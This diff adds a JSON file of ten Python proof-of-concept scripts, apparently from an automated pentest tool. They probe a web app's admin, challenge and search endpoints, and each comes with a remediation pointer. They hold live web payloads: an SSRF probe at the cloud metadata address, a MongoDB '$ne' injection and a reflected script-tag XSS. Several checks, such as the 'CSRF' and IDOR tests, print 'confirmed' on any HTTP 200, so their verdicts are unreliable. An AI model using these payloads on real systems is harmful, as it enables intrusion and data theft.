@@ -1,0 +1,126 @@
+{
+    "scripts": [
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\n\nresponse = requests.get(url)\nif response.status_code == 200 and 'config' in response.text.lower():\n    print('IDOR reproduced: Accessed admin config without authentication')\nelse:\n    print('IDOR not reproduced')",
+            "language": "python",
+            "description": "Attempts to access admin configuration endpoint directly without authentication.",
+            "weakness_id": "W-002",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1213"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement proper authentication and authorization checks for all admin endpoints."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\n\nheaders = {'Content-Type': 'application/json'}\nresponse = requests.get(url, headers=headers)\n\nif response.status_code == 200:\n    print('CSRF vulnerability confirmed: GET request succeeded without CSRF token')\nelse:\n    print('CSRF protection may be in place')",
+            "language": "python",
+            "description": "Tests if the admin configuration endpoint is vulnerable to CSRF by making a GET request without a CSRF token.",
+            "weakness_id": "W-003",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1204"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement anti-CSRF tokens for state-changing operations and sensitive data access."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\n\nresponse = requests.get(url)\nif response.status_code == 200 and ('password' in response.text or 'secret' in response.text):\n    print('Information disclosure confirmed: Sensitive config data exposed')\nelse:\n    print('No sensitive information disclosed in response')",
+            "language": "python",
+            "description": "Checks if the admin configuration endpoint leaks sensitive information like passwords or secrets.",
+            "weakness_id": "W-004",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1602"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Avoid exposing sensitive configuration details in API responses. Apply proper data filtering/redaction."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-configuration\"\n\nresponse = requests.get(url)\nif response.status_code == 200:\n    print('Broken Access Control confirmed: Unauthenticated access to admin resource')\nelse:\n    print('Access control appears to be enforced')",
+            "language": "python",
+            "description": "Verifies if there's broken access control by accessing an admin-only endpoint without credentials.",
+            "weakness_id": "W-005",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1548"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Enforce strict authentication and role-based access controls for administrative resources."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/admin/application-version\"\n\nresponse = requests.get(url)\nif response.status_code == 200 and 'version' in response.text.lower():\n    print('Information disclosure confirmed: Application version exposed')\nelse:\n    print('Application version not exposed')",
+            "language": "python",
+            "description": "Checks if the application version is unnecessarily exposed through its API endpoint.",
+            "weakness_id": "W-012",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1592"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Avoid exposing detailed version information that could aid attackers in identifying vulnerabilities."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/api/Challenges/\"\nparams = {\"name\": \"http://169.254.169.254/latest/meta-data/\"}\n\nresponse = requests.get(url, params=params)\nif response.status_code == 200 and 'metadata' in response.text.lower():\n    print('SSRF confirmed: Server made request to external metadata service')\nelse:\n    print('SSRF not confirmed')",
+            "language": "python",
+            "description": "Tests for SSRF by attempting to make the server fetch data from the cloud metadata service.",
+            "weakness_id": "W-015",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1190"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Validate and sanitize all user-supplied URLs to prevent SSRF attacks. Block internal IP ranges."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/api/Challenges/\"\nmalicious_param = {\"name\": \"{ $ne: \\\"\\\" }\"}\n\nresponse = requests.get(url, params=malicious_param)\nif response.status_code == 200 and len(response.json()) > 1:\n    print('NoSQL Injection confirmed: Bypassed intended query logic')\nelse:\n    print('NoSQL Injection not confirmed')",
+            "language": "python",
+            "description": "Attempts NoSQL injection by sending a MongoDB operator in the name parameter.",
+            "weakness_id": "W-017",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1190"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Sanitize and validate all inputs used in database queries to prevent NoSQL injection attacks."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl1 = f\"{target}/api/Challenges/?name=test1\"\nurl2 = f\"{target}/api/Challenges/?name=test2\"\n\nresp1 = requests.get(url1)\nresp2 = requests.get(url2)\n\nif resp1.status_code == 200 and resp2.status_code == 200:\n    print('IDOR confirmed: Direct object references allowed without access control')\nelse:\n    print('IDOR not confirmed')",
+            "language": "python",
+            "description": "Tests for IDOR by accessing different resources via direct object references in the name parameter.",
+            "weakness_id": "W-018",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1213"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement proper access controls to ensure users can only access authorized objects."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/api/Challenges/\"\nparams = {\"name\": [\"value1\", \"value2\"]}\n\nresponse = requests.get(url, params=params)\nif response.status_code == 200:\n    print('Parameter pollution confirmed: Multiple values accepted for single parameter')\nelse:\n    print('Parameter pollution not confirmed')",
+            "language": "python",
+            "description": "Sends multiple values for the same parameter to check for parameter pollution handling.",
+            "weakness_id": "W-020",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1190"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement strict input validation and handle multi-value parameters securely."
+        },
+        {
+            "source": "import requests\nimport sys\n\ntarget = sys.argv[1]\nurl = f\"{target}/rest/products/search\"\nxss_payload = \"<script>alert(1)</script>\"\nparams = {\"q\": xss_payload}\n\nresponse = requests.get(url, params=params)\nif xss_payload in response.text:\n    print('XSS confirmed: Payload reflected in response without sanitization')\nelse:\n    print('XSS not confirmed or properly sanitized')",
+            "language": "python",
+            "description": "Attempts reflected XSS by injecting a script tag into the q search parameter.",
+            "weakness_id": "W-023",
+            "safety_notes": "passed static safety check (pattern denylist)",
+            "technique_ids": [
+                "T1190",
+                "T1059.007"
+            ],
+            "safety_checked": true,
+            "remediation_pointer": "Implement proper output encoding and input sanitization to prevent XSS attacks."
+        }
+    ],
+    "rejected": 0
+}
